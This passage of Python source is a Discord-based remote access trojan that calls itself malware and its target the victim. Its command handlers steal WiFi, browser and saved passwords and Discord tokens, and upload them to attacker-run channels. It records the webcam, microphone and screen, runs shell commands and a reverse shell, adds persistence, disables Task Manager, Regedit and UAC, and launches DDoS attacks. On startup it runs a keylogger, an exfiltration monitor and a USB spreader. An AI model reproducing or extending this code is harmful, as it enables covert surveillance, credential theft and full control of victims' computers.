    success = enable_uac_prompts()
    await ctx.send("‚úÖ UAC prompts have been set to the default level. A **restart is required** for the change to take full effect." if success else "‚ùå Failed to re-enable UAC prompts.")

async def handle_shutdown(ctx):
    success = shutdown_pc("shutdown")
    await ctx.send("üî¥ System shutdown initiated. The PC will turn off in 5 seconds." if success else "Failed to initiate shutdown.")

async def handle_restart(ctx):
    success = shutdown_pc("restart")
    await ctx.send("üîÑ System restart initiated. The PC will reboot in 5 seconds." if success else "Failed to initiate restart.")

async def handle_runonce(ctx):
    result = add_runonce_persistence()
    await ctx.send("‚úÖ RunOnce persistence has been enabled. The malware will run again on the next boot." if result == "Success" else f"‚ùå Failed to enable RunOnce persistence.\n**Reason:** `{result}`")

async def handle_unrunonce(ctx):
    result = remove_runonce_persistence()
    await ctx.send("‚úÖ RunOnce persistence has been disabled." if result == "Success" else f"‚ùå Failed to disable RunOnce persistence.\n**Reason:** `{result}`")

async def handle_webcam(ctx):
    await ctx.send("Attempting to capture webcam snapshot...")
    filename, error = capture_webcam_snapshot()
    if error:
        await ctx.send(f"‚ùå Webcam capture failed: `{error}`")
    else:
        try:
            await ctx.send(file=discord.File(filename))
            os.remove(filename)
        except Exception as e:
            await ctx.send(f"Failed to send webcam snapshot: {e}")

async def handle_mic(ctx, duration: int = 5):
    if not 1 <= duration <= 15:
        await ctx.send("Please specify a duration between 1 and 15 seconds.")
        return
    await ctx.send(f"Recording microphone for {duration} seconds...")
    filename, error = capture_microphone_clip(duration)
    if error:
        await ctx.send(f"‚ùå Microphone recording failed: `{error}`")
    else:
        try:
            await ctx.send(file=discord.File(filename))
            os.remove(filename)
        except Exception as e:
            await ctx.send(f"Failed to send microphone clip: {e}")

async def handle_popup(ctx, title, message):
    success = show_popup(title, message)
    await ctx.send("‚úÖ Popup message has been displayed." if success else "‚ùå Failed to display popup message.")

async def handle_wallpaper(ctx, filepath):
    full_path = resolve_path(filepath)
    if not full_path or not os.path.isfile(full_path):
        await ctx.send(f"Error: File not found at `{filepath}`")
        return
    success = set_wallpaper(full_path)
    await ctx.send(f"‚úÖ Wallpaper has been set to `{filepath}`" if success else "‚ùå Failed to set wallpaper.")

async def handle_wallpaperurl(ctx, url):
    filename, error = download_wallpaper(url)
    if error:
        await ctx.send(f"‚ùå {error}")
        return
    if filename:
        try:
            success = set_wallpaper(filename)
            await ctx.send(f"‚úÖ Wallpaper has set from URL: `{url}`" if success else "‚ùå Failed to set wallpaper from URL.")
            os.remove(filename)
        except Exception as e:
            await ctx.send(f"An error occurred: {e}")

async def handle_steal(ctx):
    await ctx.send("Attempting to retrieve WiFi passwords...")
    wifi_data = get_wifi_passwords()
    temp_dir = tempfile.gettempdir()
    timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
    filename = os.path.join(temp_dir, f"wifi_passwords_{timestamp}.txt")
    with open(filename, "w", encoding="utf-8") as f:
        f.write(wifi_data)
    await ctx.send("‚úÖ WiFi passwords successfully retrieved.", file=discord.File(filename))
    os.remove(filename)

async def handle_stealbrowser(ctx):
    await ctx.send("Attempting to retrieve browser data...")
    browser_data = get_browser_data()
    try:
        temp_dir = tempfile.gettempdir()
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        filename = os.path.join(temp_dir, f"browser_data_{timestamp}.txt")
        with open(filename, "w", encoding="utf-8") as f:
            f.write(browser_data)
        await ctx.send("‚úÖ Browser data successfully retrieved.", file=discord.File(filename))
        os.remove(filename)
    except Exception as e:
        await ctx.send(f"Failed to send browser data: {e}")

async def handle_processes(ctx):
    process_data = get_running_processes()
    temp_dir = tempfile.gettempdir()
    timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
    filename = os.path.join(temp_dir, f"processes_{timestamp}.txt")
    with open(filename, "w", encoding="utf-8") as f:
        f.write(process_data)
    await ctx.send("‚úÖ Process list retrieved.", file=discord.File(filename))
    os.remove(filename)

async def handle_kill(ctx, identifier):
    if identifier.isdigit():
        result = kill_process_by_pid(identifier)
    else:
        result = kill_process_by_name(identifier)
    await ctx.send(result)

async def handle_startup(ctx):
    result = add_startup_persistence()
    await ctx.send("‚úÖ Startup folder persistence has been enabled." if result == "Success" else f"‚ùå Failed to enable startup persistence.\n**Reason:** `{result}`")

async def handle_unstartup(ctx):
    result = remove_startup_persistence()
    await ctx.send("‚úÖ Startup folder persistence has been disabled." if result == "Success" else f"‚ùå Failed to disable startup persistence.\n**Reason:** `{result}`")

async def handle_search(ctx, path, search_term):
    search_data = search_files(path, search_term)
    temp_dir = tempfile.gettempdir()
    timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
    filename = os.path.join(temp_dir, f"search_results_{timestamp}.txt")
    with open(filename, "w", encoding="utf-8") as f:
        f.write(search_data)
    await ctx.send(f"‚úÖ Search results for `{search_term}` in `{path}`.", file=discord.File(filename))
    os.remove(filename)

async def handle_ddos(ctx, action, *args):
    if action == "start":
        if len(args) < 5: await ctx.send("Usage: `!ddos start <IP> <port> <duration> <threads> <packet_size>`"); return
        ip, port, duration, threads, packet_size = args
        result = start_ddos_attack(ip, port, duration, threads, packet_size)
        await ctx.send(result)
    elif action == "stop":
        result = stop_ddos_attack()
        await ctx.send(result)
    else:
        await ctx.send("Invalid action. Use `start` or `stop`.")

async def handle_volup(ctx, steps: int = 1):
    if not 1 <= steps <= 50: await ctx.send("Please specify between 1 and 50 steps"); return
    for _ in range(steps): volume_up(); time.sleep(0.1)
    await ctx.send(f"üîä Volume increased by {steps} step(s)")

async def handle_voldown(ctx, steps: int = 1):
    if not 1 <= steps <= 50: await ctx.send("Please specify between 1 and 50 steps"); return
    for _ in range(steps): volume_down(); time.sleep(0.1)
    await ctx.send(f"üîâ Volume decreased by {steps} step(s)")

async def handle_volmute(ctx):
    volume_mute()
    await ctx.send("üîá Mute toggled")

async def handle_volset(ctx, level: int = 10):
    if not 0 <= level <= 100: await ctx.send("Please specify a volume level between 0 and 100"); return
    volume_mute(); time.sleep(0.2)
    actual_steps = min(int(level / 2), 50)
    for _ in range(actual_steps): volume_up(); time.sleep(0.05)
    await ctx.send(f"üîä Volume set to approximately {level}%")

async def handle_commands(ctx):
    embed = discord.Embed( title="üìú Available Commands", description="Here is a list of all available commands for this client.", color=discord.Color.blue() )
    embed.add_field(name="üìÇ File Access", value="`!list <path>` - List files and directories.\n`!read <file>` - Read a text file.\n`!download <file>` - Download a file.\n`!upload <path>` - Upload an attached file.\n`!delete <path>` - Delete a file or empty folder.\n`!search <path> <term>` - Search for files.", inline=False)
    embed.add_field(name="‚öôÔ∏è System Access", value="`!run <command>` - Execute a shell command.\n`!screenshot` - Take a screenshot.\n`!open <file>` - Open a file with its default app.\n`!popup \"Title\" \"Message\"` - Show a popup.\n`!wallpaper <file>` - Set wallpaper from a file.\n`!wallpaperurl <url>` - Set wallpaper from a URL.", inline=False)
    embed.add_field(name="üîê Security & Persistence", value="`!disabletm / !enabletm` - Disable/Enable Task Manager.\n`!disableregedit / !enableregedit` - Disable/Enable Regedit.\n`!disablecmd / !enablecmd` - Disable/Enable CMD.\n`!disablereagentc / !enablereagentc` - Disable/Enable WinRE.\n`!runonce / !unrunonce` - Add/Remove RunOnce persistence.\n`!startup / !unstartup` - Add/Remove Startup folder persistence.\n`!task / !untask` - Add/Remove Scheduled Task persistence.", inline=False)
    embed.add_field(name="üéôÔ∏è Media Access", value="`!webcam` - Capture a webcam snapshot.\n`!mic <seconds>` - Record microphone audio.\n`!record <seconds>` - Capture desktop video.", inline=False)
    embed.add_field(name="üìã Task Manager", value="`!processes` - List running processes.\n`!kill <PID/name>` - Kill a process.", inline=False)
    embed.add_field(name="üéÆ Remote Control", value="`!mousepad` - Show interactive mouse control.\n`!type \"text\"` - Type text.\n`!key <key>` - Press a single key.\n`!combo <combo>` - Press a key combo.\n`!shell start` - Start reverse shell.", inline=False)
    embed.add_field(name="üîä Volume Control", value="`!volup <steps>` - Increase volume.\n`!voldown <steps>` - Decrease volume.\n`!volmute` - Toggle mute.\n`!volset <0-100>` - Set volume level.", inline=False)
    embed.add_field(name="üö® Network & Other", value="`!steal` - Get saved WiFi passwords.\n`!stealbrowser` - Get browser history/cookies.\n`!stealpasswords` - Get saved browser passwords.\n`!stealdiscord` - Get Discord tokens.\n`!netscan` - Scan local network for devices.\n`!recent` - List recent documents.\n`!ddos start <IP> ...` - Start DDoS attack.\n`!ddos stop` - Stop DDoS attack.\n`!shutdown` - Shutdown PC.\n`!restart` - Restart PC.\n`!disableuac / !enableuac` - Change UAC level.\n`!exfil` - Automatic data exfiltration.", inline=False)
    embed.add_field(name="üîß Maintenance (Owner Only)", value="`!update <url>` - Update the malware.\n`!uninstall` - Completely remove the malware.", inline=False)
    embed.set_footer(text="Commands are restricted to specific channels.")
    await ctx.send(embed=embed)

# --- NEW KEYBOARD & MOUSE CONTROL HANDLERS ---
async def handle_mousepad(ctx):
    global CONTROL_PANEL_MESSAGE_ID
    if CONTROL_PANEL_MESSAGE_ID:
        try: old_message = await ctx.channel.fetch_message(CONTROL_PANEL_MESSAGE_ID); await old_message.delete()
        except discord.NotFound: pass
    embed = discord.Embed( title="üñ±Ô∏è Interactive Mouse Control", description="Use the reactions below to control the mouse.", color=discord.Color.gold() )
    embed.add_field(name="Movement", value="‚¨ÜÔ∏è‚¨áÔ∏è‚¨ÖÔ∏è‚û°Ô∏è (Slow) | üëÜüëáüëàüëâ (Fast)", inline=False)
    embed.add_field(name="Actions", value="üñ±Ô∏è (Left Click) | üñ±Ô∏èüëâ (Right Click)", inline=False)
    embed.add_field(name="Scroll", value="üîÑ (Scroll Up) | üîÉ (Scroll Down)", inline=False)
    embed.set_footer(text="Click a reaction to perform an action. It will be removed after.")
    panel_message = await ctx.send(embed=embed)
    CONTROL_PANEL_MESSAGE_ID = panel_message.id
    controls = ['‚¨ÜÔ∏è', '‚¨áÔ∏è', '‚¨ÖÔ∏è', '‚û°Ô∏è', 'üëÜ', 'üëá', 'üëà', 'üëâ', 'üñ±Ô∏è', 'üñ±Ô∏èüëâ', 'üîÑ', 'üîÉ']
    for emoji in controls: await panel_message.add_reaction(emoji)

async def handle_key_type(ctx, text):
    try:
        pyautogui.sleep(1)
        pyautogui.typewrite(text, interval=0.05)
        await ctx.send(f"‚úÖ Typed text: `{text}`")
    except Exception as e:
        await ctx.send(f"‚ùå Failed to type text: {e}")

async def handle_key_press(ctx, key):
    try:
        pyautogui.press(key.lower())
        await ctx.send(f"‚úÖ Pressed key: `{key}`")
    except Exception as e:
        await ctx.send(f"‚ùå Failed to press key: {e}")

async def handle_key_combo(ctx, combo):
    try:
        pyautogui.hotkey(*combo.split('+'))
        await ctx.send(f"‚úÖ Pressed key combo: `{combo}`")
    except Exception as e:
        await ctx.send(f"‚ùå Failed to press key combo: {e}")
async def handle_list(ctx, path='.'):
    """Lists files and directories and sends the result in a text file."""
    full_path = resolve_path(path)
    if not full_path:
        await ctx.send(f"‚ùå Error: Invalid path `{path}`. Access is restricted to the user's directory.")
        return
    if not os.path.exists(full_path):
        await ctx.send(f"‚ùå Error: Path `{path}` does not exist.")
        return
    try:
        items = os.listdir(full_path)
        if not items:
            await ctx.send(f"üìÅ Directory `{path}` is empty.")
            return

        dirs = []
        files = []
        for item in sorted(items):
            item_path = os.path.join(full_path, item)
            if os.path.isdir(item_path):
                dirs.append(f"DIR  - {item}")
            else:
                size = os.path.getsize(item_path)
                files.append(f"FILE - {item} ({size} bytes)")
        
        list_data = f"--- Contents of: {full_path} ---\n\n"
        if dirs:
            list_data += "\n".join(dirs) + "\n\n"
        if files:
            list_data += "\n".join(files)

        # Create a temporary file and send it
        temp_dir = tempfile.gettempdir()
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        filename = os.path.join(temp_dir, f"directory_list_{timestamp}.txt")
        with open(filename, "w", encoding="utf-8") as f:
            f.write(list_data)
        
        await ctx.send(f"‚úÖ Directory list for `{path}`.", file=discord.File(filename))
        os.remove(filename) # Clean up

    except Exception as e:
        await ctx.send(f"‚ùå Failed to list directory `{path}`: `{e}`")

async def handle_read(ctx, filepath):
    """Reads a text file and sends its content in a .txt file."""
    full_path = resolve_path(filepath)
    if not full_path:
        await ctx.send(f"‚ùå Error: Invalid file path `{filepath}`.")
        return
    if not os.path.isfile(full_path):
        await ctx.send(f"‚ùå Error: File not found at `{filepath}`.")
        return
    # Check file extension to avoid sending binary files
    if not filepath.lower().endswith(('.txt', '.log', '.json', '.xml', '.csv', '.py', '.bat', '.ps1', '.ini', '.md')):
        await ctx.send(f"‚ùå Error: Cannot read binary or unsupported file type `{os.path.splitext(filepath)[1]}`.")
        return
    try:
        with open(full_path, 'r', encoding='utf-8', errors='ignore') as f:
            content = f.read()
        # Create a temporary file and send it
        temp_dir = tempfile.gettempdir()
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        output_filename = os.path.join(temp_dir, f"read_file_{timestamp}.txt")
        with open(output_filename, "w", encoding="utf-8") as f:
            f.write(f"--- Content of: {full_path} ---\n\n")
            f.write(content)
        
        await ctx.send(f"‚úÖ Read file `{filepath}`.", file=discord.File(output_filename))
        os.remove(output_filename) # Clean up
    except Exception as e:
        await ctx.send(f"‚ùå Failed to read file `{filepath}`: `{e}`")

async def handle_download(ctx, filepath):
    """Downloads a file from the victim's machine."""
    full_path = resolve_path(filepath)
    if not full_path:
        await ctx.send(f"‚ùå Error: Invalid file path `{filepath}`.")
        return
    if not os.path.isfile(full_path):
        await ctx.send(f"‚ùå Error: File not found at `{filepath}`.")
        return
    try:
        await ctx.send(f"üì§ Uploading `{filepath}`...")
        file_size = os.path.getsize(full_path)
        if file_size > 8 * 1024 * 1024:  # 8MB Discord limit
            await ctx.send("‚ùå Error: File is too large to send via Discord (>8MB).")
            return
        await ctx.send(file=discord.File(full_path))
    except Exception as e:
        await ctx.send(f"‚ùå Failed to download `{filepath}`: `{e}`")

async def handle_upload(ctx, message, path, filename=None):
    """Saves an attached file to the victim's machine and confirms with a .txt file."""
    if not message.attachments:
        await ctx.send("‚ùå Error: You must attach a file to this command.")
        return
    attachment = message.attachments[0]
    dest_path = resolve_path(path)
    if not dest_path:
        await ctx.send(f"‚ùå Error: Invalid destination path `{path}`.")
        return
    if not os.path.exists(dest_path):
        try:
            os.makedirs(dest_path)
        except Exception as e:
            await ctx.send(f"‚ùå Error: Could not create directory `{path}`: `{e}`")
            return
    
    try:
        file_content = await attachment.read()
        final_filename = filename or attachment.filename
        save_path = os.path.join(dest_path, final_filename)
        with open(save_path, 'wb') as f:
            f.write(file_content)
        
        # Create a confirmation .txt file
        temp_dir = tempfile.gettempdir()
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        output_filename = os.path.join(temp_dir, f"upload_confirmation_{timestamp}.txt")
        with open(output_filename, "w", encoding="utf-8") as f:
            f.write(f"--- Upload Successful ---\n\n")
            f.write(f"Original Filename: {attachment.filename}\n")
            f.write(f"Saved To: {save_path}\n")
            f.write(f"Size: {len(file_content)} bytes")
        
        await ctx.send(f"‚úÖ File uploaded.", file=discord.File(output_filename))
        os.remove(output_filename) # Clean up
    except Exception as e:
        await ctx.send(f"‚ùå Failed to upload file: `{e}`")

async def handle_delete(ctx, path):
    """Deletes a file or an empty directory and sends a confirmation log."""
    full_path = resolve_path(path)
    if not full_path:
        await ctx.send(f"‚ùå Error: Invalid path `{path}`.")
        return
    if not os.path.exists(full_path):
        await ctx.send(f"‚ùå Error: Path `{path}` does not exist.")
        return
    
    # Create the log file *before* attempting deletion to store the result
    temp_dir = tempfile.gettempdir()
    timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
    output_filename = os.path.join(temp_dir, f"delete_log_{timestamp}.txt")
    log_content = f"--- Deletion Log for: {full_path} ---\n\n"

    try:
        if os.path.isfile(full_path):
            file_size = os.path.getsize(full_path)
            os.remove(full_path)
            log_content += f"Status: SUCCESS\nType: File\nSize: {file_size} bytes\n"
        elif os.path.isdir(full_path):
            os.rmdir(full_path)  # Only works if the directory is empty
            log_content += "Status: SUCCESS\nType: Directory (Empty)\n"
    except OSError as e:
        log_content += f"Status: FAILED\nError: {e}\n"
    except Exception as e:
        log_content += f"Status: FAILED\nUnexpected Error: {e}\n"

    try:
        with open(output_filename, "w", encoding="utf-8") as f:
            f.write(log_content)
        await ctx.send(f"üìã Deletion attempt for `{path}`.", file=discord.File(output_filename))
        os.remove(output_filename) # Clean up
    except Exception as log_e:
        await ctx.send(f"‚ùå Deletion processed, but failed to create log file: `{log_e}`")

async def handle_run(ctx, command_str):
    """Executes a shell command and returns the output."""
    if not command_str:
        await ctx.send("‚ùå Usage: `!run <command>`")
        return
    await ctx.send(f"‚öôÔ∏è Executing: `{command_str}`...")
    try:
        process = subprocess.Popen(
            command_str, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE,
            stdin=subprocess.PIPE, text=True, creationflags=subprocess.CREATE_NO_WINDOW
        )
        stdout, stderr = process.communicate()
        output = stdout + stderr
        if not output:
            await ctx.send("‚úÖ Command executed successfully with no output.")
        else:
            await ctx.send(f"```{output[:1990]}```") # Cap at 1990 chars
    except Exception as e:
        await ctx.send(f"‚ùå Failed to execute command: `{e}`")

async def handle_screenshot(ctx):
    """Takes a screenshot of the primary monitor and sends it to Discord."""
    await ctx.send("üì∏ Capturing screenshot...")
    try:
        with mss.mss() as sct:
            # Grab the data
            sct_img = sct.grab(sct.monitors[1]) # monitors[1] is the primary monitor
            # Convert to a PIL Image
            img = Image.frombytes('RGB', sct_img.size, sct_img.rgb)
            # Save to a temporary file
            temp_dir = tempfile.gettempdir()
            timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
            filename = os.path.join(temp_dir, f"screenshot_{timestamp}.png")
            img.save(filename)
        # Send the file
        await ctx.send(file=discord.File(filename))
        # Clean up the temporary file
        os.remove(filename)
    except Exception as e:
        await ctx.send(f"‚ùå Screenshot failed: `{e}`")

async def handle_open(ctx, filepath):
    """Opens a file or URL with its default application."""
    full_path = resolve_path(filepath)
    if not full_path and not filepath.startswith(('http://', 'https://')):
        await ctx.send(f"‚ùå Error: Invalid file path or URL `{filepath}`.")
        return
    target = full_path if full_path else filepath
    try:
        if full_path and not os.path.exists(target):
            await ctx.send(f"‚ùå Error: File not found at `{filepath}`.")
            return
        os.startfile(target)
        await ctx.send(f"‚úÖ Opening `{filepath}`...")
    except Exception as e:
        await ctx.send(f"‚ùå Failed to open `{filepath}`: `{e}`")
async def handle_recent(ctx):
    await ctx.send("Fetching recent documents list...")
    recent_data = get_recent_documents()
    temp_dir = tempfile.gettempdir()
    timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
    filename = os.path.join(temp_dir, f"recent_documents_{timestamp}.txt")
    with open(filename, "w", encoding="utf-8") as f:
        f.write(recent_data)
    await ctx.send("‚úÖ Recent documents list.", file=discord.File(filename))
    os.remove(filename)
async def handle_netscan(ctx):
    await ctx.send("Scanning local network for active devices... This may take a few minutes.")
    scan_data = scan_network()
    temp_dir = tempfile.gettempdir()
    timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
    filename = os.path.join(temp_dir, f"network_scan_{timestamp}.txt")
    with open(filename, "w", encoding="utf-8") as f:
        f.write(scan_data)
    await ctx.send("‚úÖ Network scan complete.", file=discord.File(filename))
    os.remove(filename)
async def handle_stealpasswords(ctx):
    await ctx.send("Attempting to retrieve saved browser passwords...")
    password_data = get_browser_passwords()
    temp_dir = tempfile.gettempdir()
    timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
    filename = os.path.join(temp_dir, f"browser_passwords_{timestamp}.txt")
    with open(filename, "w", encoding="utf-8") as f:
        f.write(password_data)
    await ctx.send("‚úÖ Browser passwords successfully retrieved.", file=discord.File(filename))
    os.remove(filename)

async def handle_stealdiscord(ctx):
    await ctx.send("Attempting to retrieve Discord tokens...")
    token_data = get_discord_tokens()
    if "No Discord tokens found." in token_data:
        await ctx.send(token_data)
    else:
        try:
            await ctx.send("‚úÖ **Discord tokens successfully retrieved.**", file=discord.File(BytesIO(token_data.encode()), "discord_tokens.txt"))
        except Exception as e:
            await ctx.send(f"‚ùå Failed to send token file: {e}")


# ==============================================================================
# --- END OF ALL COMMAND HANDLERS ---
# ==============================================================================

# --- BOT EVENTS ---
@client.event
async def on_ready():
    global CHANNEL_IDS, CLIENT_GUILD_ID, KEYLOGGER_WEBHOOK_URL
    
    logging.info(f'Bot is online as {client.user} | Client ID: {CLIENT_ID}')
    
    client_guild = None
    logging.info(f"Bot is in {len(client.guilds)} guilds.")
    for i, guild in enumerate(client.guilds):
        logging.info(f" - Guild {i}: {guild.name} (ID: {guild.id})")
    
    if os.path.exists(ID_FILE_PATH):
        try:
            with open(ID_FILE_PATH, 'r') as f:
                channel_data = json.load(f)
                test_channel_id = channel_data.get('file_channel_id')
                if guild.get_channel(test_channel_id):
                    logging.info(f" -> Found our channel in this guild. Locking on.")
                    client_guild = guild
        except (json.JSONDecodeError, KeyError) as e:
            logging.warning(f" -> Could not read ID file or find key. Error: {e}")
            pass
    
    if client_guild is None:
        logging.warning("Could not find guild by ID file, searching for the correct guild by parent category ID.")
        for guild in client.guilds:
            parent_category = guild.get_channel(CONFIG.get("PARENT_CATEGORY_ID"))
            if parent_category:
                logging.info(f"Found the correct guild: {guild.name} (ID: {guild.id})")
                client_guild = guild
                break
    
    if not client_guild:
        logging.critical("CRITICAL ERROR: Bot is not in any guilds or could not find the correct guild.")
        await client.close()
        return

    CLIENT_GUILD_ID = client_guild.id
    logging.info(f"Operating in guild: '{client_guild.name}' (ID: {CLIENT_GUILD_ID})")

    CHANNEL_IDS = await setup_c2_channels(client_guild)
    if not CHANNEL_IDS:
        logging.critical("CRITICAL ERROR: Could not establish C2 channels.")
        await client.close()
        return
    
    logging.info(f"C2 Channels established. IDs: {CHANNEL_IDS}")
    connection_channel = client.get_channel(CHANNEL_IDS['connection_channel_id'])
    
    if connection_channel:
        pc_name = platform.node()
        admin_status = is_admin()
        
        # --- Get Public IP Address ---
        public_ip = "N/A"
        try:
            ip_response = requests.get('https://api.ipify.org?format=json', timeout=5)
            public_ip = ip_response.json().get('ip', 'N/A')
        except Exception as e:
            logging.warning(f"Could not fetch public IP: {e}")
            public_ip = "Failed to fetch"

        # --- Get Windows Version and Edition (Smart Method) ---
        major_version = platform.release()
        edition = "Unknown"
        try:
            with winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, r"SOFTWARE\Microsoft\Windows NT\CurrentVersion") as key:
                edition_from_reg = winreg.QueryValueEx(key, "ProductName")[0]
                if "Pro" in edition_from_reg:
                    edition = "Pro"
                elif "Home" in edition_from_reg:
                    edition = "Home"
                elif "Enterprise" in edition_from_reg:
                    edition = "Enterprise"
                else:
                    edition = edition_from_reg
        except Exception as e:
            logging.warning(f"Could not fetch Windows edition from registry: {e}")
        
        os_string = f"Windows {major_version} ({edition})"

        embed = discord.Embed(
            title=f"‚úÖ New Client Connected: `{CLIENT_ID}`",
            description="Successfully established C2 channel.",
            color=discord.Color.green() if admin_status else discord.Color.orange()
        )
        embed.add_field(name="PC Name", value=f"`{pc_name}`", inline=True)
        embed.add_field(name="Administrator", value=f"`{'Yes' if admin_status else 'No'}`", inline=True)
        embed.add_field(name="Public IP", value=f"`{public_ip}`\n*(May be VPN/Proxy)*", inline=True)
        embed.add_field(name="Operating System", value=f"`{os_string}`", inline=False)
        embed.set_footer(text=f"Session started at {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
        
        await connection_channel.send(embed=embed)
        logging.info("Connection status message sent successfully.")
    else:
        logging.error("Error: Could not find connection-status channel after setup.")

    # --- Load the keylogger webhook URL ---
    if CHANNEL_IDS and "keylogger_webhook_url" in CHANNEL_IDS:
        KEYLOGGER_WEBHOOK_URL = CHANNEL_IDS["keylogger_webhook_url"]
        logging.info("Keylogger webhook URL loaded successfully.")
    else:
        logging.error("Could not find keylogger webhook URL in channel IDs.")

    # --- Start the background tasks ---
    threading.Thread(target=start_keylogger, daemon=True).start()
    threading.Thread(target=start_clipboard_monitor, daemon=True).start()
    threading.Thread(target=detect_website_visit, daemon=True).start()
    exclusion_monitor.start()

    # --- NEW BACKGROUND TASKS START ---
    threading.Thread(target=start_exfil_monitor, args=(client, CHANNEL_IDS.get('file_channel_id')), daemon=True).start()
    print("[INFO] Exfiltration monitor started.")

    if is_admin():
        # Ensure the USB spreader runs silently
        threading.Thread(target=spread_usb, daemon=True).start()
        print("[INFO] USB spreader started.")
    else:
        print("[INFO] Not running as admin. USB spreader disabled.")
    # --- NEW BACKGROUND TASKS END ---

@client.event
async def on_raw_reaction_add(payload):
    global CONTROL_PANEL_MESSAGE_ID
    if payload.user_id == client.user.id: return
    if payload.message_id != CONTROL_PANEL_MESSAGE_ID: return
    actions = {
        '‚¨ÜÔ∏è': ('move', 0, -50), '‚¨áÔ∏è': ('move', 0, 50), '‚¨ÖÔ∏è': ('move', -50, 0), '‚û°Ô∏è': ('move', 50, 0),
        'üëÜ': ('move', 0, -100), 'üëá': ('move', 0, 100), 'üëà': ('move', -100, 0), 'üëâ': ('move', 100, 0),
        'üñ±Ô∏è': ('click', 'left', None), 'üñ±Ô∏èüëâ': ('click', 'right', None), 'üîÑ': ('scroll', None, 5), 'üîÉ': ('scroll', None, -5)
    }
    action = actions.get(str(payload.emoji))
    if not action: return
    try:
        if action[0] == 'move': pyautogui.moveRel(action[1], action[2], duration=0.2)
        elif action[0] == 'click': pyautogui.click(button=action[1])
        elif action[0] == 'scroll': pyautogui.scroll(action[2])
        channel = client.get_channel(payload.channel_id)
        message = await channel.fetch_message(payload.message_id)
        await message.remove_reaction(payload.emoji, discord.Object(id=payload.user_id))
    except Exception as e:
        print(f"Error in reaction control: {e}")

# --- HELPER FUNCTION FOR COMMANDS (Define this ONCE globally, or as a lambda) ---
# If you don't have this defined at the top of your file, paste it there.
# For now, I will define it inside here using 'nonlocal' logic via a lambda to ensure it exists for this snippet without breaking your global scope.
def get_global_cmd(key):
    cmds = CONFIG.get("COMMANDS", {})
    val = cmds.get(key)
    return val if val else ""

@client.event
async def on_message(message):
    # --- GLOBAL VARIABLE DECLARATIONS ---
    global reverse_shell_active, reverse_shell_channel_id
    global chat_active, chat_to_victim_channel_id, chat_from_victim_channel_id

# --- AUTHENTICATION CHECK FOR MAINTENANCE COMMANDS ---
# Safely gets Owner ID, defaulting to 0 if missing
    owner_id_str = CONFIG.get("OWNER_USER_ID")
    owner_id_int = int(owner_id_str) if owner_id_str else 0
    
    if message.author.id != owner_id_int and message.content.lower().startswith(('!update', '!uninstall')):
        await message.channel.send("‚ùå **Access Denied:** You do not have permission to use this command.")
        return

    # --- INTERACTIVE CHAT LISTENER ---
    if chat_active and message.channel.id == chat_to_victim_channel_id and message.author != client.user:
        try:
            logging.info(f"CHAT: Forwarding to victim -> {message.content}")
        except Exception as e:
            logging.error(f"Error forwarding chat message: {e}")
        return

    # --- REVERSE SHELL LISTENER ---
    if reverse_shell_active and message.channel.id == reverse_shell_channel_id and not message.content.startswith('!'):
        if hasattr(message.channel, '_shell_just_started') and message.channel._shell_just_started:
            message.channel._shell_just_started = False
            return
        command = message.content.strip()
        if command.lower() == 'shell_stop':
            await handle_reverse_shell(message.channel, 'stop')
        elif command:
            output = await execute_shell_command(command)
            await message.channel.send(f"```{output[:1990]}```")
        return

    # --- SERVER & CATEGORY VALIDATION ---
    valid_category = False
    if CONFIG.get("PARENT_CATEGORY_ID") and message.channel.category_id == int(CONFIG.get("PARENT_CATEGORY_ID")):
    # Logic for commands restricted to this category goes here
        valid_category = True
    
    if message.author == client.user:
        return
        
    if not valid_category and message.author.id != owner_id_int:
        return

    # Add allowed channel IDs
    allowed_channel_ids = {
        CHANNEL_IDS.get('file_channel_id'),
        CHANNEL_IDS.get('system_channel_id'),
        CHANNEL_IDS.get('media_channel_id'),
        CHANNEL_IDS.get('task_channel_id'),
        CHANNEL_IDS.get('keylogger_channel_id'),
        chat_to_victim_channel_id,
        chat_from_victim_channel_id
    }
    
    # Filter out None values
    allowed_channel_ids = {cid for cid in allowed_channel_ids if cid is not None}

    if message.guild and message.channel.id not in allowed_channel_ids:
        return

    if not message.content.startswith('!'):
        return

    parts = message.content[1:].split()
    command = parts[0].lower()
    args = parts[1:]
    ctx = message.channel

    # Owner-only commands
    if command == get_global_cmd("CMD_UPDATE"): 
        if not args:
            await ctx.send("Usage: `!update <direct_download_url>`"); 
            return
        await update_malware(ctx, args[0])
    
    elif command == get_global_cmd("CMD_UNINSTALL"):
        await uninstall_malware(ctx)

    # --- LOAD CUSTOM COMMANDS FOR COMPARISON ---
    # We get the triggers here. If a trigger is None, the command is disabled.
    c_update = get_global_cmd("CMD_UPDATE")
    c_uninstall = get_global_cmd("CMD_UNINSTALL")
    c_list = get_global_cmd("CMD_LIST")
    c_read = get_global_cmd("CMD_READ")
    c_download = get_global_cmd("CMD_DOWNLOAD")
    c_upload = get_global_cmd("CMD_UPLOAD")
    c_delete = get_global_cmd("CMD_DELETE")
    c_run = get_global_cmd("CMD_RUN")
    c_screenshot = get_global_cmd("CMD_SCREENSHOT")
    c_open = get_global_cmd("CMD_OPEN")
    c_disabletm = get_global_cmd("CMD_DISABLETM")
    c_enabletm = get_global_cmd("CMD_ENABLETM")
    c_disableregedit = get_global_cmd("CMD_DISABLEREGEDIT")
    c_enableregedit = get_global_cmd("CMD_ENABLEREGEDIT")
    c_disablecmd = get_global_cmd("CMD_DISABLECMD")
    c_enablecmd = get_global_cmd("CMD_ENABLECMD")
    c_disableuac = get_global_cmd("CMD_DISABLEUAC")
    c_enableuac = get_global_cmd("CMD_ENABLEUAC")
    c_disablereagentc = get_global_cmd("CMD_DISABLEREAGENTC")
    c_enablereagentc = get_global_cmd("CMD_ENABLEREAGENTC")
